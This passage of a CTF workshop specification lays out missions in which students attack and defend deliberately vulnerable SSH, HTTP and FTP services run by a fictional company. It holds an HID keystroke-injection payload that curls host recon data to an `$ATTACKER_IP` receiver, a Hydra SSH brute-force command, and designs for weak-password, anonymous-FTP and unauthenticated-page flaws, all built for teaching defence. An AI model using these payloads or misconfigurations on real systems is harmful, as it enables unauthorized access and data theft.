# Operation Duck Hunt — Project Specification (Single Source of Truth)

This document consolidates every confirmed decision for Operation Duck Hunt, a hands-on
cybersecurity workshop and CTF organized by PawnGuard, centered on a Human Interface
Device (HID / keystroke-injection) attack as the entry vector. It supersedes all prior
versions of this guide. Sections 1–5 restate the architecture already agreed; Section 6
contains the complete **Hydra's Trial** implementation spec; Section 11 is a reusable
**mission template**; Section 12 contains the complete **Hidden Page** implementation
spec; Section 13 contains the complete **Anonymous Leak** implementation spec; Section 14
contains the complete **Shared Secrets** implementation spec; Section 15 contains the
complete **Broken Trail** implementation spec (merging the former Broken Permissions and
Log Hunter missions — see §1's mission catalog note); Section 16 contains the complete
**Name Game** implementation spec. §6, §12, §13, §14, §15 and §16 are all ready for
Copilot.

---

## 1. Project overview

- Hands-on cybersecurity workshop + attacker-vs-defender CTF, organized by PawnGuard.
- Audience: beginner → beginner-intermediate.
- Format: Theory → Demo → CTF, 120 minutes total.
- OS: Linux. Containerization: Docker. Concurrent matches: 6+ attacker/defender pairs.

### Mission catalog

| # | Mission | Main subject | Status |
|---|---------|--------------|--------|
| 1 | Hydra's Trial | SSH | **Spec complete (this doc, §6)** |
| 2 | Hidden Page | HTTP | **Spec complete (this doc, §12)** |
| 3 | Anonymous Leak | FTP | **Spec complete (this doc, §13)** |
| 4 | Shared Secrets | SMB / Samba | **Spec complete (this doc, §14)** |
| 5 | Broken Trail | Linux permissions + logs | **Spec complete (this doc, §15)** |
| 6 | Name Game | DNS | **Spec complete (this doc, §16)** |
| 7 | API Misconfigured | HTTP API | Not started |

> **Decision:** the original missions 5 (Broken Permissions) and 6 (Log Hunter) are
> merged into a single mission, **Broken Trail**, rather than kept separate — the two
> subjects compose naturally (permission misconfigurations are exactly how sensitive logs
> end up exposed) and splitting them was adding a mission without adding a distinct skill.
> The catalog is now 7 missions, not 8; Name Game and API Misconfigured keep their
> original design intent, just renumbered.

---

## 2. Infrastructure and deployment

- Each defender runs their mission containers locally; attackers target the defender's
  assigned mission IP; all participants share one isolated local network with no
  internet/school-network uplink.
- **Modular container architecture** (confirmed): reusable base images, one container per
  service, independent per-defender deployments on private Docker networks, independent
  reset/config per mission. No more "one container per mission."
- **Company website is per-defender**, not shared: every defender runs their own instance
  of the reusable AURELION image with mission-specific content; it resets with the mission.
- **Network enforcement is a rules/scope matter, not a technical control** in this version:
  attackers are restricted to their assigned IP by workshop rules, not firewalled off from
  other participants. This must be stated explicitly in the organizer briefing and the
  participant rules sheet.

---

## 3. Fictional company: AURELION Technologies

- Mid-sized tech company: cloud infrastructure/hosting, enterprise networking, software
  development, data storage, managed IT services.
- Reusable website sections: Home, IT Department, Employee Resources, Support Center,
  Infrastructure, Security Policies (not all sections active in every mission).
- Stays constant across missions: branding, layout, navigation, company info, visual design.
- Changes per mission: internal documents, exposed directories, vulnerability clues,
  incident announcements, mission-specific resources.
- Design principle: looks like a real corporate portal, not a CTF prop. Vulnerabilities are
  found through investigation, not advertised.

---

## 4. HID reconnaissance and attacker communication — confirmed architecture

- HID device plugs into the defender's Linux workstation, performs initial recon, and
  **automatically exfiltrates the results** to the attacker's machine over the isolated LAN.
- Attacker runs a lightweight terminal HTTP receiver: starts automatically before the round,
  listens on a predefined port, prints received recon data to the terminal — no web UI, no
  DB, no attacker-side Docker environment.
- HID payload carries **configurable variables** (`ATTACKER_IP`, `RECEIVER_PORT`) set by
  organizers per pair before the round, so one payload image/script is reused for everyone.
- Constraint carried into every mission: the HID **only** collects what that mission's
  story needs — never unrelated host or personal data from the defender's real machine.

> §6.2 below finalizes the exact recon actions, payload, protocol, and receiver for
> Hydra's Trial specifically. §11 defines how later missions should extend/reuse it.

---

## 5. CTF rules and win conditions

- **Attacker wins**: submits a valid flag before the defender neutralizes the vulnerability.
- **Defender wins** by: (1) identifying the vulnerability, (2) detecting the attack
  activity, (3) applying an effective mitigation, (4) verifying the original exploit path
  no longer works, (5) preserving legitimate service functionality.
- **Time expiration**: defender wins by default, unless they invalidated the mission
  (service shutdown, disabling required access, disconnecting the workstation).
- **Invalid defensive actions** (auto-loss / disqualifying): killing all mission services,
  disabling all SSH when SSH is required, disconnecting the workstation, breaking
  legitimate user access.
- No scoring portal, no digital submission form of any kind. **Flag submission is verbal**:
  the attacker raises a hand and tells the organizer the flag; the organizer checks it
  against the per-round assigned value on the spot. This applies to all 8 missions, not
  just Hydra's Trial — carry it into every mission's §X.10 organizer material instead of
  re-deciding it per mission. Organizers should keep a simple paper or spreadsheet log of
  (pair_id, flag claimed, time, correct?) for later review, since there's no system doing
  it for them.
- Organizers validate flags manually (see §6.11 for Hydra's Trial acceptance tests, which
  double as the manual-validation checklist).

---

## 6. Hydra's Trial — complete mission specification

**Subject:** SSH · **Difficulty:** beginner → beginner-intermediate
**Skills taught:** SSH, HTTP/directory-listing investigation, filesystem exploration,
password auditing with Hydra, authentication-log analysis, account security, mitigation.

### 6.1 Story

AURELION Technologies accidentally exposed internal IT resources on its company website.
Among them is a technical-documentation folder referencing an SSH service account. The
attacker must investigate the website, recover the username, brute-force weak credentials
with Hydra, connect over SSH, and locate a disguised flag. The defender must detect the
attempt and lock it down without breaking legitimate SSH access.

### 6.2 HID reconnaissance — resolved

| Item | Decision |
|---|---|
| Delivery mechanism | USB Rubber Ducky–class keystroke-injection device. On insertion it opens a terminal on the defender's Linux workstation and types a short bash one-liner (no GUI automation needed — defender OS is Linux). |
| Recon actions | `hostname`; `hostname -I` (first local IPv4); `whoami`; `cat /etc/os-release` (pretty name only); a fixed `MISSION_ID=hydra-trial` tag. Nothing else — no file listing, no credential dumping, no network scan. This keeps the HID payload itself non-exploitative; the real vulnerabilities live in the website/SSH service, not in the HID step. |
| Output fields (JSON) | `{"mission_id":"hydra-trial","hostname":"...","local_ip":"...","user":"...","os":"...","timestamp":"..."}` |
| Transport | One `curl -s -m 3 -X POST http://$ATTACKER_IP:$RECEIVER_PORT/recon -H "Content-Type: application/json" -d '{...}'` call. Plain HTTP (lab network only, no TLS needed). 3-second timeout so a misconfigured pair fails fast and visibly instead of hanging the round. |
| Payload variables | `ATTACKER_IP`, `RECEIVER_PORT` templated into the DuckyScript/bash payload per pair by an organizer script before the round (reusing the project-wide pairing mechanism from §4). |
| Exfil content boundary | Only the five fields above. Explicitly excludes: SSH keys, `/etc/passwd`, shell history, browser data, or anything not required to point the attacker at the mission target. |

### 6.3 Attacker receiver — resolved

| Item | Decision |
|---|---|
| Language | Python 3, standard library only (`http.server` + `BaseHTTPRequestHandler`) — zero install friction on attacker workstations. |
| Port | `8080` default (overridable by the same `RECEIVER_PORT` baked into the HID payload). |
| Behavior | Single `POST /recon` endpoint; parses JSON body; pretty-prints `mission_id`, `hostname`, `local_ip`, `user`, `os`, `timestamp` to stdout; responds `200 OK`; logs nothing to disk (keep it ephemeral/simple per the "no DB" decision). |
| Startup | `receiver.py` launched via a one-line organizer script (`./start_receiver.sh <port>`) run at the top of the round; no systemd unit needed since attacker workstations are ephemeral per round. |
| Validation | Rejects non-JSON bodies and bodies missing `mission_id` with a `400`, so a misdirected or malformed payload is obvious in the terminal instead of silently failing. |
| Pairing | Organizer-maintained `pairs.csv`: `pair_id, defender_ip, attacker_ip, receiver_port, mission_id`. A small organizer script renders each pair's HID payload and each attacker's receiver start command from this file before the round. |

### 6.4 AURELION website — resolved

| Item | Decision |
|---|---|
| Active sections for this mission | Home, IT Department (only — other sections return their normal placeholder content, not 404, to avoid telegraphing "this is the vulnerable one"). |
| Exposed directory listing | `/it-department/resources/` — Nginx/Apache **autoindex on**, intentionally left on by the fictional AURELION IT team (the "accidental exposure" from the story). |
| IT resources path | `/it-department/resources/ssh-migration/` — contains the filesystem clue set from §6.5. |
| Realism guard | Directory listing shows real-looking timestamps/file sizes; no CTF-styled filenames (`ssh-migration-notes.txt`, not `clue1.txt`). |

### 6.5 Filesystem / clue design — resolved

Directory `/it-department/resources/ssh-migration/` contains:

- `network-diagram-2025.pdf` — decoy, irrelevant content.
- `vendor-contacts.csv` — decoy, irrelevant content.
- `old-password-policy.txt` — decoy; a *real-sounding but outdated* password policy (red
  herring — attacker may be tempted to think policy rules apply; they don't, Hydra needs
  the actual wordlist from §6.6).
- `ssh-migration-notes.txt` — **the clue**: an internal memo about migrating a legacy
  service account ahead of a server move, mentioning the account `svc-netbackup` is
  "still using the temporary password set during provisioning — rotate before go-live."
  This gives the attacker the SSH username without stating a password.

Both the website step (finding the directory) and the filesystem step (reading the right
file among decoys) are mandatory — the HID recon alone is not enough.

### 6.6 SSH account & Hydra exercise — resolved

| Item | Decision |
|---|---|
| Username | `svc-netbackup` (fictional service account, matches the "migration" story). |
| Password | A weak, human-guessable value drawn from the organizer wordlist below — e.g. `Summer2024!` (placeholder; organizers rotate the actual value per event/run so published writeups don't leak it). |
| Wordlist | Organizer-supplied (already exists outside this doc) — shipped as `wordlists/hydra-trial.txt` in the mission repo. This spec does not author its contents; the only requirement on it is §6.11's acceptance test ("current round's password is within the list"). |
| Hydra command (reference, given to participants in the theory segment) | `hydra -l svc-netbackup -P wordlists/hydra-trial.txt ssh://<target-ip> -t 4 -W 2` |
| Rate/time bound | SSH daemon config caps `MaxStartups 10:30:60` and `MaxAuthTries 6` per connection (realistic hardening baseline, not an artificial CTF limiter); combined with `-t 4` in the suggested Hydra command this keeps a full wordlist run under ~2 minutes, well inside the mission's share of the 120-minute workshop. |
| Scope | Hydra may only be pointed at the attacker's own assigned mission IP — this is a workshop-rules constraint (consistent with §2's network-enforcement decision), not a technical block. |

### 6.7 SSH home directory & flag — resolved

Home directory for `svc-netbackup` contains ordinary-looking decoys (`backup.sh`,
`.bash_history`, `notes.txt`, a stale `cron_backup.log`) plus one file that is not
obviously a flag container:

- `system_update.log` — looks like a routine patch log; the **last line** is formatted as
  a fake log entry embedding the flag, e.g.
  `[2026-01-04 03:12:01] update-check: result=OK token=FLAG{...}`.

This keeps "flag discovery" as a real step (skim several files, recognize the right one)
rather than a trivial `cat flag.txt`.

### 6.8 Defender workflow, logs & mitigation — resolved

| Item | Decision |
|---|---|
| Log source | `/var/log/auth.log` inside the `hydra-ssh` container, readable via `docker exec hydra-ssh tail -f /var/log/auth.log` or an SSH session as an admin account. |
| Detection signal | Repeated `Failed password for svc-netbackup` lines from the same source IP in a short window — exactly what Hydra's `-t 4` burst produces. |
| Approved mitigation (pick one, both pass acceptance tests) | (a) Rotate `svc-netbackup`'s password to a strong value and keep password auth; or (b) disable password auth for that account specifically (force key-based) while leaving a separate legitimate account on password or key auth untouched. Mitigations are evaluated against §5's "invalid defensive actions" list — disabling SSH service-wide fails the mission. |
| Verification account | A second, pre-seeded account `aurelion-admin` (key-based auth, unrelated to the mission vulnerability) represents "legitimate access." Defender must show this account can still log in after mitigation — this is the acceptance check for "preserve legitimate functionality." |
| Rate-limiting add-on (optional, stretch goal for advanced defenders) | Fail2ban jail on `sshd` as an additional/alternative mitigation, consistent with the project's general security posture (`gotchas.md` / Hack2Dawn precedent of Fail2ban+iptables layering, reused here for teaching continuity). |

### 6.9 Container architecture — resolved

| Container | Responsibility | Base image | Published port (per-defender offset) |
|---|---|---|---|
| `company-web` | AURELION site, `/it-department/resources/ssh-migration/` autoindex | `nginx:alpine` + static site content | `80` → host `8001+N` |
| `hydra-ssh` | SSH service, `svc-netbackup` + `aurelion-admin` accounts, auth logs, home dir, flag | `debian:bookworm-slim` + `openssh-server` | `22` → host `2200+N` |

- Both containers sit on the same defender's private Docker network (per §2's modular
  architecture); `company-web` need not talk to `hydra-ssh` at runtime — the link between
  them is narrative (website clue → SSH target), not network-level.
- `N` = the pair/defender index (1–6+), giving every defender a unique, predictable port
  pair for organizer/attacker addressing.

### 6.10 Deployment, health checks, reset — resolved

| Item | Decision |
|---|---|
| Orchestration | `docker-compose.yml` per mission, parameterized by a `.env` per defender (`PAIR_ID`, host-port offsets). |
| Health checks | `company-web`: `curl -f http://localhost/ \|\| exit 1`. `hydra-ssh`: `nc -z localhost 22 \|\| exit 1`. Both on a 10s interval, 3 retries, matching the project's existing Docker-Compose conventions. |
| Resource limits | `mem_limit: 256m`, `cpus: 0.5` per container — generous enough for 6+ concurrent pairs on typical workshop laptops without starving the host. |
| Reset procedure | `./reset-mission.sh <pair_id>` runs `docker compose -p hydra-trial-<pair_id> down -v && docker compose -p hydra-trial-<pair_id> up -d --force-recreate`, which reseeds the account, wordlist-independent password, home directory, and logs from the built image (no persistent volumes for mutable mission state, by design, so reset is always clean). |

### 6.11 Organizer material — resolved

- **Hints (3-tier, revealed on request during the round):**
  1. "AURELION's IT team sometimes forgets to lock down directory browsing — check their
     resources pages."
  2. "One of the migration documents mentions an account that still has a temporary
     password."
  3. "Hydra needs a username and a wordlist — both are in the documents you've already
     found."
- **Solution walkthrough:** website → `/it-department/resources/ssh-migration/` → read
  `ssh-migration-notes.txt` → username `svc-netbackup` → `hydra -l svc-netbackup -P
  wordlists/hydra-trial.txt ssh://<ip>` → SSH in → skim files → flag is the token in the
  last line of `system_update.log`.
- **Flag submission:** verbal, per §5 — no upload page or form. Organizer compares the
  spoken flag against the round's assigned value and logs it.
- **Acceptance tests (used for manual flag/mitigation validation, per §5):**
  1. Directory listing is reachable and shows the four files from §6.5, no more, no less.
  2. `ssh-migration-notes.txt` names `svc-netbackup` and does not name the password.
  3. The shipped wordlist contains the current round's password within its 15–20 entries.
  4. `hydra` against a fresh container recovers the password in under 2 minutes.
  5. Flag format and value in `system_update.log` match the round's assigned flag.
  6. After an approved mitigation (§6.8), the original password/credentials no longer
     authenticate, and `aurelion-admin` still can.
  7. `reset-mission.sh` returns the container to the pre-attack state (new/unknown-to-
     attacker password rotation only if organizers choose to rotate between rounds).

---

## 7. Hydra's Trial — decision log (superseded)

All 14 items previously tracked as pending here are now resolved in §6.2–§6.11 above.
This section is kept only as a changelog pointer; do not re-answer these in future edits —
amend §6 directly instead.

---

## 8. Current project status

| Area | Status |
|---|---|
| Overall workshop structure | Defined |
| Network and deployment model | Defined |
| Modular container architecture | Defined |
| AURELION fictional environment | Defined |
| HID communication concept (general) | Defined (project-wide, §4) |
| Hydra's Trial workflow | Defined |
| **Hydra's Trial implementation spec** | **Defined — ready for Copilot (§6)** |
| **Hidden Page implementation spec** | **Defined — ready for Copilot (§12)** |
| **Anonymous Leak implementation spec** | **Defined — ready for Copilot (§13)** |
| **Shared Secrets implementation spec** | **Defined — ready for Copilot (§14)** |
| **Broken Trail implementation spec** (merged mission) | **Defined — ready for Copilot (§15)** |
| **Name Game implementation spec** | **Defined — ready for Copilot (§16)** |
| Remaining mission (API Misconfigured) | Not started in detail; template ready (§11) |

---

## 9. Documentation status

This file is now the canonical single source of truth for Operation Duck Hunt. Prior
versions (including the original `workshopGuideOverview.md` and the partially-synced
`workshopGuideOverview_updated.md`) are superseded by this document.

---

## 10. Recommended next steps

1. Hand §6, §12, §13, §14, §15 and §16 to Copilot as the implementation specs for
   Hydra's Trial, Hidden Page, Anonymous Leak, Shared Secrets, Broken Trail, and Name
   Game (Docker images, site content, service containers, receiver script, organizer
   scripts).
2. Build and smoke-test one defender instance of each (`N=1`) end-to-end against their
   acceptance tests (§6.11, §12.11, §13.11, §14.11, §15.10, §16.10) before scaling to 6+
   pairs.
3. Use §11's template to draft Mission 7 — API Misconfigured (HTTP API) next, the last
   mission in the catalog, following the same resolve-every-row discipline applied to the
   first six.
4. Keep this file updated as the only spec document; retire ad-hoc summaries once their
   content is merged here.

---

## 11. Mission specification template (for missions 2–8)

Copy this skeleton per mission and resolve every row before handing it to Copilot — this
is exactly the discipline that turned Hydra's Trial from a workflow sketch into a buildable
spec in §6.

```markdown
## X. <Mission Name> — complete mission specification

**Subject:** <protocol/topic> · **Difficulty:** <level>
**Skills taught:** <list>

### X.1 Story
<AURELION-consistent narrative hook for this mission's vulnerability>

### X.2 HID reconnaissance for this mission
| Item | Decision |
|---|---|
| Recon actions | <only what THIS mission's story needs> |
| Output fields | <JSON schema> |
| Transport | <reuse §4/§6.3 receiver, or note deltas> |
| Exfil content boundary | <explicit exclusion list> |

### X.3 Website route(s) & exposed resource
| Item | Decision |
|---|---|
| Active sections | |
| Exposed path | |
| Realism guard | |

### X.4 Filesystem / clue design
<decoys + the one real clue, same discipline as §6.5>

### X.5 Core vulnerability & exploitation path
<protocol-specific — e.g. FTP anonymous login, SMB open share, DNS zone transfer, etc.>

### X.6 Flag placement
<non-obvious location/encoding, consistent with §6.7's "not flag.txt" principle>

### X.7 Defender workflow, logs & mitigation
| Item | Decision |
|---|---|
| Log source | |
| Detection signal | |
| Approved mitigation(s) | |
| Verification account/check | |

### X.8 Container architecture
| Container | Responsibility | Base image | Published port (per-defender offset) |
|---|---|---|---|

### X.9 Deployment, health checks, reset
<mirror §6.10's pattern>

### X.10 Organizer material
<hints, walkthrough, acceptance tests — mirror §6.11's pattern>
```

**Cross-mission constraints that apply to every entry in §11 (do not re-litigate per
mission):** modular container architecture (§2), per-defender website instance (§2),
AURELION realism principle (§3), HID exfil-boundary discipline (§6.2's "only what's
needed"), win conditions and invalid-defensive-actions list (§5), and verbal flag
submission / organizer-manual validation (no scoring portal, no upload page, §5).

---

## 12. Hidden Page — complete mission specification

**Subject:** HTTP · **Difficulty:** beginner → beginner-intermediate
**Skills taught:** HTTP investigation, `robots.txt` reconnaissance, directory/path
brute-forcing (`gobuster`/`ffuf`), recognizing information disclosure vs. real access
control, broken access control (OWASP A01), HTTP access-log analysis, defensive
authentication/allowlisting.

### 12.1 Story

AURELION's Support Center team built an internal "Incident Dashboard" to track live
customer incidents and never put it behind a login — they relied on the page simply not
being linked from the site, and even helpfully `Disallow`'d it in `robots.txt` so search
engines wouldn't index it. That `robots.txt` entry is itself the giveaway. The attacker
must notice it (or brute-force the path directly), load the unauthenticated dashboard, and
find the flag hidden among ordinary-looking incident records. The defender must recognize
that "unlinked" isn't "secured" and add real access control without taking the dashboard
down for AURELION staff who do use it.

### 12.2 HID reconnaissance for this mission

| Item | Decision |
|---|---|
| Recon actions | Same minimal set as Hydra's Trial (§6.2): `hostname`, `hostname -I`, `whoami`, `cat /etc/os-release`, fixed `MISSION_ID=hidden-page`. No mission-specific extra data is needed — this mission's entire challenge lives in the website, not in anything the HID needs to surface. |
| Output fields | Identical schema to §6.2, `mission_id` value changed to `"hidden-page"`. |
| Transport | Reuses the exact §6.3 receiver — no new receiver build required, just point the same `receiver.py` at this round's pair. |
| Exfil content boundary | Same boundary as §6.2: hostname/IP/user/OS/mission tag only. |

### 12.3 Website route(s) & exposed resource

| Item | Decision |
|---|---|
| Active sections | Home, Support Center (IT Department and the others render normal placeholder content, consistent with §6.4's realism guard). |
| `robots.txt` | Present at site root, includes `Disallow: /internal/incident-dashboard/` — the deliberate disclosure. |
| Exposed path | `/internal/incident-dashboard/` — a plain HTML page, **no authentication**, not linked from any navigation menu. |
| Realism guard | Dashboard looks like a genuine internal tool (AURELION branding, a table of "incidents" with IDs/dates/status/notes), not a CTF-styled page. |

### 12.4 Filesystem / clue design

No separate filesystem-investigation step in this mission (unlike Hydra's Trial) — the
entire clue chain is HTTP-native: `robots.txt` → hidden path → dashboard table. This is an
intentional contrast so participants learn that not every mission needs a file-listing
pivot; sometimes the web server's own metadata is the leak.

### 12.5 Core vulnerability & exploitation path

1. Attacker requests `/robots.txt`, notices the disallowed `/internal/incident-dashboard/`
   path (or alternatively finds it via `gobuster`/`ffuf` against a common wordlist, which
   also works and is explicitly taught as the fallback technique).
2. Attacker requests the path directly — no login prompt, no 403, page loads (**broken
   access control**: the page assumes obscurity is security).
3. Dashboard renders a table of 6–8 fake incidents; one row's "Notes" field contains the
   flag disguised as an internal tracking reference (see §12.6).

### 12.6 Flag placement

Incident #7's Notes column reads something like:
`"Escalated to on-call. Tracking Ref: FLAG{...}. Closed after patch."` — formatted
identically to the other rows' routine notes, so skimming the table (not just viewing
source) is required to spot it.

### 12.7 Defender workflow, logs & mitigation

| Item | Decision |
|---|---|
| Log source | nginx/Apache `access.log` inside `company-web`. |
| Detection signal | A burst of 404s from one source IP (gobuster/ffuf sweep) followed by a `200` on `/internal/incident-dashboard/` — distinguishable from normal traffic by volume and timing. |
| Approved mitigation | Add real access control to `/internal/`: HTTP Basic Auth (new `support-staff` credential) or an IP allowlist restricted to the defender's declared "internal" subnet. **Removing the path from `robots.txt` or deleting the `robots.txt` entry alone does not pass** — that's still obscurity, not access control, and acceptance tests check for this (§12.11). |
| Verification account/check | A `support-staff` Basic Auth credential (or allowlisted IP, per chosen mitigation) must still reach the dashboard after mitigation; the original unauthenticated request must now return `401`/`403`. |

### 12.8 Container architecture

| Container | Responsibility | Base image | Published port (per-defender offset) |
|---|---|---|---|
| `company-web` | AURELION site + `robots.txt` + unauthenticated `/internal/incident-dashboard/` | `nginx:alpine` + static site content | `80` → host `8101+N` |

Single-container mission by design — unlike Hydra's Trial, Hidden Page doesn't need a
second service, which is itself a useful demonstration that the modular architecture
scales down as well as up. Port base `8101` (vs. Hydra's Trial's `8001`) keeps the two
missions' host ports from colliding if an organizer ever needs both running at once.

### 12.9 Deployment, health checks, reset

| Item | Decision |
|---|---|
| Orchestration | `docker-compose.yml` per mission, parameterized by `.env` per defender (`PAIR_ID`, host-port offset), same pattern as §6.10. |
| Health check | `curl -f http://localhost/ || exit 1`, 10s interval, 3 retries. |
| Resource limits | `mem_limit: 128m`, `cpus: 0.25` — lighter than Hydra's Trial since it's static content only. |
| Reset procedure | `./reset-mission.sh <pair_id>` → `docker compose -p hidden-page-<pair_id> down -v && up -d --force-recreate`, reseeding the dashboard content and `robots.txt` from the built image. |

### 12.10 Organizer material

- **Hints (3-tier):**
  1. "AURELION's Support Center is public — but is everything on it actually *linked*
     from the site?"
  2. "Check what the site itself says shouldn't be crawled."
  3. "Once you're on the dashboard, read the notes column carefully, not just the status
     column."
- **Solution walkthrough:** `GET /robots.txt` → note `Disallow: /internal/incident-
  dashboard/` → `GET /internal/incident-dashboard/` (loads with no auth) → scan the
  incident table → flag is in Incident #7's Notes field.
- **Flag submission:** verbal, per §5 — no upload page or form.
- **Acceptance tests:**
  1. `/robots.txt` is served and lists the dashboard path under `Disallow`.
  2. `/internal/incident-dashboard/` returns `200` with no auth prompt, pre-mitigation.
  3. The dashboard shows 6–8 incident rows; exactly one contains the round's flag.
  4. A `gobuster`/`ffuf` run with a common wordlist also surfaces the path (fallback
     technique must work, not just the `robots.txt` route).
  5. Post-mitigation: unauthenticated request to the dashboard returns `401`/`403`.
  6. Post-mitigation: the `support-staff` credential (or allowlisted IP) still reaches
     the dashboard — legitimate access preserved.
  7. A mitigation that only edits/removes the `robots.txt` entry, with the dashboard
     still open to anonymous requests, **fails** this checklist — confirm it's rejected.
  8. `reset-mission.sh` returns the container to the pre-attack state.

---

## 13. Anonymous Leak — complete mission specification

**Subject:** FTP · **Difficulty:** beginner → beginner-intermediate
**Skills taught:** FTP protocol basics, anonymous-login discovery, passive-mode file
transfer, distinguishing decoy files from real content, FTP transfer-log analysis,
defensive FTP hardening (disabling anonymous access while preserving a legitimate
authenticated workflow).

### 13.1 Story

AURELION's IT team stood up a temporary FTP server so an external vendor could sync backup
files during a migration, and left anonymous login enabled "just for the migration window."
The migration finished; the FTP server didn't get locked back down. The attacker must learn
the server exists (via a Support Center article, not a port scan hint), connect anonymously,
browse the exposed backup share, and find a flag hidden among routine-looking backup
artifacts. The defender must detect the anonymous access and shut it off without breaking
the vendor's legitimate authenticated sync.

### 13.2 HID reconnaissance for this mission

| Item | Decision |
|---|---|
| Recon actions | Same minimal set as §6.2/§12.2: `hostname`, `hostname -I`, `whoami`, `cat /etc/os-release`, fixed `MISSION_ID=anonymous-leak`. No FTP-specific data needed from the HID — the service's existence is learned from the website, keeping the HID's role identical across missions (point the attacker at the target, nothing more). |
| Output fields | Identical schema to §6.2, `mission_id` value `"anonymous-leak"`. |
| Transport | Reuses the §6.3 receiver unchanged. |
| Exfil content boundary | Same boundary as §6.2/§12.2. |

### 13.3 Website route(s) & exposed resource

| Item | Decision |
|---|---|
| Active sections | Home, Support Center, IT Department (a short "Infrastructure Notice" post). |
| Clue location | An IT Department announcement: *"Temporary FTP access enabled for vendor backup sync during the Q3 migration — anonymous access will be disabled once migration work is confirmed complete."* No IP/port given — just enough to tell the attacker which protocol to try against the target IP they already have from HID recon. |
| Realism guard | Phrased as a routine internal ops notice, not a hint — the kind of thing that really would get left up and forgotten. |

### 13.4 Filesystem / clue design

Exposed via the FTP server itself rather than the website (mission-to-mission variety,
consistent with Hidden Page's HTTP-native approach in §12.4). Anonymous login lands in
`/pub/vendor-backups/` containing:

- `README.txt` — decoy, generic vendor-sync instructions.
- `invoice-archive-2025Q2.zip` — decoy, a small innocuous zip.
- `db-backup-2026-01.sql.gz` — decoy, a plausible but irrelevant backup artifact.
- `backup-manifest.log` — **the real file**: a routine-looking manifest listing backup
  jobs, checksums, and statuses, with the flag embedded in one entry's `note=` field
  (see §13.6), not as a standalone obvious file.

### 13.5 Core vulnerability & exploitation path

1. Attacker reads the IT Department notice, infers an FTP service is likely still live.
2. `ftp <target-ip>` or `lftp ftp://<target-ip>`, logs in with `anonymous` / any email-
   style string as the password (vsftpd anonymous login, intentionally permissive).
3. `ls` / `cd pub/vendor-backups`, downloads the four files.
4. Skims `backup-manifest.log` (not the zip or sql.gz — those are red herrings), finds the
   flag in the manifest entry's `note=` field.

### 13.6 Flag placement

One line of `backup-manifest.log` reads like:
`job=nightly-sync-114 status=OK checksum=a1b2c3... note=FLAG{...}` — formatted exactly
like the surrounding routine entries, so the attacker has to actually read the file rather
than just confirm it downloaded.

### 13.7 Defender workflow, logs & mitigation

| Item | Decision |
|---|---|
| Log source | vsftpd's own log (`/var/log/vsftpd.log` or `xferlog`, mounted/readable inside the `anon-ftp` container) — records anonymous logins and each file retrieved. |
| Detection signal | An `anonymous` login followed by `RETR` commands against `pub/vendor-backups/*` from the attacker's IP — distinct from the legitimate vendor account's authenticated session pattern. |
| Approved mitigation | Set `anonymous_enable=NO` in `vsftpd.conf` and restart the service, while a pre-provisioned authenticated account (`vendor-sync`) remains available for the real vendor workflow. Simply stopping the whole FTP service fails §5's invalid-defensive-actions list. |
| Verification account/check | `vendor-sync` (password- or key-based FTP login, organizer's choice) must still authenticate and download from `pub/vendor-backups/` after mitigation; a fresh anonymous login attempt must now be refused. |

### 13.8 Container architecture

| Container | Responsibility | Base image | Published port(s) (per-defender offset) |
|---|---|---|---|
| `company-web` | AURELION site + IT Department migration notice (mission-specific content on the reusable image) | `nginx:alpine` | `80` → host `8201+N` |
| `anon-ftp` | vsftpd, anonymous login enabled by default, `pub/vendor-backups/` content, `vendor-sync` authenticated account | `debian:bookworm-slim` + `vsftpd` | control `21` → host `2101+N`; passive range 10 ports → host `30000+(N*10)`–`30009+(N*10)` |

- FTP's passive-mode data connections require publishing a narrow, **per-defender**
  passive port range (`pasv_min_port`/`pasv_max_port` set inside the container to match
  the published host range) — this is the one piece of plumbing this mission needs that
  the HTTP/SSH missions didn't, and it must be unique per defender to avoid port clashes
  across 6+ concurrent pairs.
- `vsftpd.conf` also sets `pasv_address` to the defender host's LAN IP so passive-mode
  clients get a reachable address back from the server, not an internal Docker IP.

### 13.9 Deployment, health checks, reset

| Item | Decision |
|---|---|
| Orchestration | `docker-compose.yml` per mission, `.env` per defender carrying `PAIR_ID`, web port offset, FTP control port offset, and the passive port range bounds. |
| Health checks | `company-web`: `curl -f http://localhost/ || exit 1`. `anon-ftp`: `nc -z localhost 21 || exit 1`. 10s interval, 3 retries. |
| Resource limits | `company-web`: `mem_limit: 128m, cpus: 0.25`. `anon-ftp`: `mem_limit: 128m, cpus: 0.25`. |
| Reset procedure | `./reset-mission.sh <pair_id>` → `docker compose -p anon-leak-<pair_id> down -v && up -d --force-recreate`, reseeding `pub/vendor-backups/` content and re-enabling anonymous login from the built image (undoing any mitigation from the previous round). |

### 13.10 Organizer material

- **Hints (3-tier):**
  1. "AURELION mentioned a temporary file-transfer setup somewhere in their IT
     announcements — what protocol would that be?"
  2. "Some FTP servers let you log in without real credentials. Try the username
     `anonymous`."
  3. "Once you're browsing the backup folder, the flag isn't in the zip or the `.sql.gz`
     — check the manifest log line by line."
- **Solution walkthrough:** read IT Department notice → infer FTP → `ftp <ip>`, login
  `anonymous` → `cd pub/vendor-backups` → download all four files → open
  `backup-manifest.log` → flag is in the `note=` field of one job entry.
- **Flag submission:** verbal, per §5 — no upload page or form.
- **Acceptance tests:**
  1. `company-web`'s IT Department page mentions the temporary FTP access without
     revealing credentials or a direct hint stronger than "temporary FTP access."
  2. Anonymous FTP login succeeds pre-mitigation; `pub/vendor-backups/` lists exactly
     the four files from §13.4.
  3. `backup-manifest.log` contains the round's flag in exactly one entry's `note=` field.
  4. Passive-mode transfers work end-to-end on the defender's assigned port range (not
     just active mode) — this is the most common real-world FTP-in-Docker failure point,
     so it's called out explicitly as its own test.
  5. `vendor-sync` authenticated login works both before and after mitigation.
  6. Post-mitigation: anonymous login is refused (`530`-class response).
  7. A mitigation that stops the entire `anon-ftp` container/service **fails** this
     checklist, per §5's invalid-defensive-actions list — confirm it's rejected.
  8. `reset-mission.sh` returns the container to the pre-attack state, anonymous login
     re-enabled.

---

## 14. Shared Secrets — complete mission specification

**Subject:** SMB / Samba · **Difficulty:** beginner → beginner-intermediate
**Skills taught:** SMB share enumeration (`smbclient -L`, `enum4linux`), null/guest
session access, distinguishing a misconfigured share from normal shares on the same
server, Samba access-log analysis, defensive share-permission hardening while preserving
a legitimate authenticated workflow.

### 14.1 Story

AURELION's Finance team keeps shared spreadsheets on an internal Samba file server. Most
shares require a login — but `Finance_Shared` was set up in a hurry during an audit crunch
and was left with guest access enabled "temporarily." The attacker must learn the share
name (from an Employee Resources how-to-connect article, not from guessing), enumerate the
